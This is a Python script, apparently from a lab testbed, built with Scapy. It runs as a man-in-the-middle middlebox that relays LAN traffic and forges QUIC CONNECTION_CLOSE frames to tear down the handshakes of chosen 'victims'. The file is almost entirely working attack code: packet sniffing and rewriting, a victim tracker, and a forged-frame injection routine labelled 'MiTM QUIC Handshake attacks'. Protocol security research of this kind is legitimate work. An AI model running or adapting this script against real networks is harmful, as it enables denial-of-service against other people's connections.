import os
import argparse

from scapy.all import *
load_contrib("quic")

from scapy.layers.quic import *
from connection_close import QUIC_CONNECTION_CLOSE
bind_bottom_up(UDP, QUIC, dport=443)
bind_bottom_up(UDP, QUIC, sport=443)
bind_layers(UDP, QUIC, dport=443, sport=443)
from forge import forge_cc_scapy
import threading, sys, os
from victims import Victims





def add_and_send_to_server(pkt):
    new_pkt = pkt[IP]
    new_pkt[IP].src = "10.69.0.100"
    del new_pkt.getlayer(IP).chksum
    del new_pkt.getlayer(UDP).chksum
    #print(f"New PKT to server: {new_pkt.summary()}")
    send(new_pkt, iface=outer_iface, verbose=False)


def send_attack(victim):
    # build a CONNECTION_CLOSE frame
    cc = QUIC_CONNECTION_CLOSE(
        type          = 0x1C,
        error_code    = 0x10,         # arbitrary error
        frame_type    = 0,            # e.g. PADDING triggered it
        reason_phrase = b"oops!"
    )
    frame  = bytes(cc)
    tpl    = (victim[IP].src, victim[UDP].sport, victim[IP].dst, victim[UDP].dport)
    dcid_for_keys   = victim[QUIC_Initial].DstConnID      # client-chosen DCID → secrets
    dcid_in_header  = victim[QUIC_Initial].SrcConnID      # client’s SrcCID     → header
    forged = forge_cc_scapy(
        dcid_secret = dcid_for_keys,
        dcid_header = dcid_in_header,
        tpl = tpl,
        frame = frame)
    send(forged, iface=inner_iface, verbose=False)

def handle_quic(pkt):
    global vs
    # Only process if this packet has a QUIC Initial header
    if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr(inner_iface) and pkt.getlayer(Ether).src != get_if_hwaddr(outer_iface):
        if pkt.sniffed_on == inner_iface:
            vs.update(pkt)
            if QUIC_Initial in pkt and (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
                send_attack(pkt)
                return
                
            add_and_send_to_server(pkt)
            
            

                    
        elif pkt.sniffed_on == outer_iface:
            new_dst = vs.find_victim_from_wan_by_port(pkt[UDP].dport)
            if new_dst != "":
                #print(f"From server: {pkt.summary()}")
                new_pkt = pkt[IP]
                new_pkt[IP].dst = new_dst
                del new_pkt.getlayer(IP).chksum
                del new_pkt.getlayer(UDP).chksum
                #print(f"New PKT to client: {new_pkt.summary()}")
                send(new_pkt, iface=inner_iface, verbose=False)
            else:
                print("A packet of unknown LAN destination.")
                # Need to fix change of victim sport with new connections of same src and dest ips.


if __name__ == "__main__":
    """
        Global variables, constants and configurations settings.
    """
    parser = argparse.ArgumentParser(description="MiTM QUIC Handshake attacks")
    parser.add_argument(
        "--inner-iface",
        type=str,
        default='middlebox-eth0',
        help="The name of the interface/network adapter that connects the middlebox to the LAN network.",
    )
    parser.add_argument(
        "--outer-iface",
        type=str,
        default='middlebox-eth1',
        help="The name of the interface/network adapter that connects the middlebox to the Router/WAN network.",
    )
    args = parser.parse_args()
    
    ##TODO: add changing of those while running 
    inner_iface = args.inner_iface
    outer_iface = args.outer_iface
    vs = Victims()
    #print(f"Inner_iface: {inner_iface} , Outer_iface: {outer_iface}")      
    threading.Thread(target=vs.run, daemon=True).start()
    # Sniff UDP 443 traffic and invoke handle_quic for each packet
    sniff(
        iface=[inner_iface, outer_iface],
        prn=handle_quic,         # callback for every packet
        store=False                  # don’t keep packets in memory
    )
